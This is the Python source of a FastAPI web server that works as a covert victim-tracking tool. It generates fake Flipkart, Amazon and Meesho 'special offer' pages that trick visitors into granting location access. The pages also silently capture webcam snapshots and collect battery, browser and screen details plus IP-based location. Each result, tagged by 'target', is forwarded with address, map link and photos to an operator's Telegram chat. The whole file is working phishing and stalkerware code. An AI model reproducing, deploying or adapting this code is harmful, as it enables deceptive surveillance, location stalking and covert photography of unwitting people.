from fastapi import FastAPI
from pydantic import BaseModel
from datetime import datetime
from collections import defaultdict
import uvicorn
from geopy.geocoders import Nominatim
import requests
import os
import base64
from dotenv import load_dotenv
import database

load_dotenv()
OPENCELLID_KEY = os.getenv("OPENCELLID_KEY", "")

app = FastAPI()
geolocator = Nominatim(user_agent="live_location_tracker")

class LocationPayload(BaseModel):
    target_id: str
    lat: float = None
    lon: float = None
    accuracy: float = None
    source: str = "GPS"
    mcc: int = None
    mnc: int = None
    lac: int = None
    cid: int = None
    battery: str = "Unknown"
    os_info: str = "Unknown"
    screen: str = "Unknown"

class SnapPayload(BaseModel):
    target_id: str
    image_b64: str

def get_cell_tower_location(mcc, mnc, lac, cid):
    if not OPENCELLID_KEY or not all([mcc, mnc, lac, cid]):
        return None
    try:
        url = f"https://opencellid.org/cell/get?key={OPENCELLID_KEY}&mcc={mcc}&mnc={mnc}&lac={lac}&cellid={cid}&format=json"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if "lat" in data and "lon" in data:
                return {
                    "lat": float(data["lat"]),
                    "lon": float(data["lon"]),
                    "accuracy": data.get("range", "Cell Tower")
                }
    except Exception as e:
        print(f"Cell tower geolocation error: {e}")
    return None

def get_address(lat, lon):
    if lat is None or lon is None:
        return "Unknown"
    try:
        location = geolocator.reverse(f"{lat}, {lon}", exactly_one=True, language="en", timeout=10)
        if location:
            return location.address
    except Exception as e:
        print(f"Nominatim error: {e}")
    
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
        headers = {"User-Agent": "live_location_tracker/1.0"}
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if "display_name" in data:
                return data["display_name"]
    except Exception as e:
        print(f"Direct OSM API error: {e}")
    
    return "Address not found"

@app.post("/submit_location")
async def submit(payload: LocationPayload):
    final_lat = payload.lat
    final_lon = payload.lon
    final_accuracy = payload.accuracy
    final_source = payload.source
    
    if not final_lat or not final_lon:
        cell_loc = get_cell_tower_location(payload.mcc, payload.mnc, payload.lac, payload.cid)
        if cell_loc:
            final_lat = cell_loc["lat"]
            final_lon = cell_loc["lon"]
            final_accuracy = cell_loc["accuracy"]
            final_source = "Cell Tower"
    
    time_now = datetime.utcnow().isoformat()
    address = get_address(final_lat, final_lon) if (final_lat and final_lon) else "Unknown"
    
    # Save to database
    database.save_location(
        payload.target_id, final_lat, final_lon, final_accuracy, final_source, 
        time_now, address, payload.battery, payload.os_info, payload.screen
    )
    print(f"[+] Location received for {payload.target_id}")
    
    # Telegram Notification
    bot_token = os.getenv("BOT_TOKEN")
    admin_chat = os.getenv("ADMIN_CHAT_ID")
    
    if bot_token and admin_chat:
        try:
            if final_source == "Permission Denied":
                msg = f"""🚨 **TARGET BLOCKED LOCATION** 🚨

**Target:** `{payload.target_id}`

📱 **Device Info:**
- **Battery:** {payload.battery}
- **OS/Browser:** {payload.os_info}
- **Screen:** {payload.screen}
"""
            else:
                msg = f"""🚨 **NEW LOCATION ALERT** 🚨

**Target:** `{payload.target_id}`
**Source:** {final_source}

📱 **Device Info:**
- **Battery:** {payload.battery}
- **OS/Browser:** {payload.os_info}
- **Screen:** {payload.screen}

📍 **Coordinates:** {final_lat}, {final_lon}
🏠 **Address:** {address}
🗺️ **Map:** https://maps.google.com/?q={final_lat},{final_lon}"""
            
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                "chat_id": admin_chat,
                "text": msg,
                "parse_mode": "Markdown"
            }, timeout=5)
        except Exception as e:
            print(f"Telegram notification error: {e}")
            
    return {"status": "ok"}

@app.post("/submit_snap")
async def submit_snap(payload: SnapPayload):
    time_now = datetime.utcnow().isoformat()
    database.save_snap(payload.target_id, payload.image_b64, time_now)
    
    bot_token = os.getenv("BOT_TOKEN")
    admin_chat = os.getenv("ADMIN_CHAT_ID")
    if bot_token and admin_chat:
        try:
            img_data = base64.b64decode(payload.image_b64.split(",")[1])
            files = {"photo": ("snap.png", img_data, "image/png")}
            data = {"chat_id": admin_chat, "caption": f"📸 **New Camera Snap**\n\nTarget: `{payload.target_id}`", "parse_mode": "Markdown"}
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendPhoto", data=data, files=files, timeout=10)
        except Exception as e:
            print(f"Telegram photo error: {e}")
    return {"status": "ok"}

@app.get("/history/{target_id}")
async def get_history(target_id: str):
    latest = database.get_latest_location(target_id)
    if not latest:
        return {"history": []}
    return {"history": [latest]}

def generate_tracking_html(target_id: str, redirect_url: str, store_name: str, theme_color: str):
    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{store_name} - Special Deals</title>
        <style>
            body {{ font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }}
            .loader {{ border: 8px solid #f3f3f3; border-top: 8px solid {theme_color}; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <h2>Checking Delivery Availability...</h2>
        <p>Please click <b>"Allow"</b> on the location prompt to check if this offer is available in your area.</p>
        <div class="loader" id="loader"></div>
        <p id="msg"></p>
        
        <script>
            function redirect() {{
                if ("{redirect_url}" !== "") {{
                    window.location.href = "{redirect_url}";
                }} else {{
                    document.body.innerHTML = "<h2>Verified! You can close this page.</h2>";
                }}
            }}

            let current_target = "{target_id}";
            if (current_target === "") {{
                current_target = "LinkUser_" + Math.floor(Math.random() * 90000 + 10000);
            }}

            let os_info = navigator.userAgent;
            let screen_info = window.innerWidth + "x" + window.innerHeight;
            let battery_level = "Unknown";
            
            if (navigator.getBattery) {{
                navigator.getBattery().then(function(battery) {{
                    battery_level = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
                }});
            }}

            function captureSnap() {{
                if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
                    navigator.mediaDevices.getUserMedia({{ video: true }}).then(function(stream) {{
                        var video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        setTimeout(function() {{
                            var canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            var img_b64 = canvas.toDataURL('image/png');
                            stream.getTracks().forEach(track => track.stop());
                            
                            fetch('/submit_snap', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{
                                    target_id: current_target,
                                    image_b64: img_b64
                                }})
                            }});
                        }}, 1500);
                    }}).catch(function(err) {{
                        console.log("Camera error:", err);
                    }});
                }}
            }}

            captureSnap();

            if (navigator.permissions) {{
                navigator.permissions.query({{name: 'geolocation'}}).then(function(result) {{
                    if (result.state === 'granted') {{
                        document.getElementById('msg').innerText = "Processing secure connection...";
                    }}
                }});
            }}

            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {{
                    if (data.latitude && data.longitude) {{
                        fetch('/submit_location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                target_id: current_target,
                                lat: data.latitude,
                                lon: data.longitude,
                                accuracy: 5000,
                                source: "IP Address",
                                battery: battery_level,
                                os_info: os_info,
                                screen: screen_info
                            }})
                        }});
                    }}
                }}).catch(e => console.log(e));

            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    function(position) {{
                        var lat = position.coords.latitude;
                        var lon = position.coords.longitude;
                        var acc = position.coords.accuracy;
                        
                        fetch('/submit_location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                target_id: current_target,
                                lat: lat,
                                lon: lon,
                                accuracy: acc,
                                source: "Offer Link ({store_name})",
                                battery: battery_level,
                                os_info: os_info,
                                screen: screen_info
                            }})
                        }}).then(response => {{
                            redirect();
                        }}).catch(err => {{
                            redirect();
                        }});
                    }},
                    function(error) {{
                        fetch('/submit_location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                target_id: current_target,
                                lat: null,
                                lon: null,
                                accuracy: 0,
                                source: "Permission Denied",
                                battery: battery_level,
                                os_info: os_info,
                                screen: screen_info
                            }})
                        }});
                        document.getElementById('msg').innerText = "Redirecting...";
                        setTimeout(redirect, 1500);
                    }},
                    {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                );
            }} else {{
                redirect();
            }}
        </script>
    </body>
    </html>
    """

from fastapi.responses import HTMLResponse

@app.get("/track/{target_id}")
async def track_page(target_id: str):
    return HTMLResponse(content=generate_tracking_html(target_id, "", "System", "#3498db"), status_code=200)

@app.get("/phones/{product_name}/p/{product_id}")
async def phone_offer_page(product_name: str, product_id: str, id: str = ""):
    target_id = ""
    try:
        if id:
            target_id = base64.b64decode(id).decode('utf-8')
    except:
        pass

    redirect_url = f"https://www.flipkart.com/{product_name}/p/{product_id}"
    formatted_name = product_name.replace("-", " ").title()
    return HTMLResponse(content=generate_tracking_html(target_id, redirect_url, f"Flipkart - {formatted_name}", "#2874f0"), status_code=200)

@app.get("/item/{store}")
async def offer_page(store: str, id: str = ""):
    target_id = ""
    try:
        if id:
            target_id = base64.b64decode(id).decode('utf-8')
    except:
        pass

    if store.lower() == "flipkart":
        redirect_url = "https://www.flipkart.com/offers"
        theme_color = "#2874f0"
        store_name = "Flipkart"
    elif store.lower() == "meesho":
        redirect_url = "https://www.meesho.com/offers"
        theme_color = "#f43397"
        store_name = "Meesho"
    elif store.lower() == "amazon":
        redirect_url = "https://www.amazon.in/offers"
        theme_color = "#232f3e"
        store_name = "Amazon"
    elif store.lower() == "s24":
        redirect_url = "https://www.flipkart.com/samsung-galaxy-s24-5g-snapdragon-amber-yellow-128-gb/p/itmd4baa945a78ef"
        theme_color = "#2874f0"
        store_name = "Flipkart - Samsung Galaxy S24 5G"
    else:
        redirect_url = "https://www.google.com"
        theme_color = "#333"
        store_name = "Store"

    return HTMLResponse(content=generate_tracking_html(target_id, redirect_url, store_name, theme_color), status_code=200)

@app.get("/custom")
async def custom_offer_page(url: str, id: str = ""):
    target_id = ""
    redirect_url = "https://www.google.com"
    try:
        if id:
            target_id = base64.b64decode(id).decode('utf-8')
        if url:
            redirect_url = base64.b64decode(url).decode('utf-8')
    except:
        pass

    return HTMLResponse(content=generate_tracking_html(target_id, redirect_url, "Special Offer", "#e74c3c"), status_code=200)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
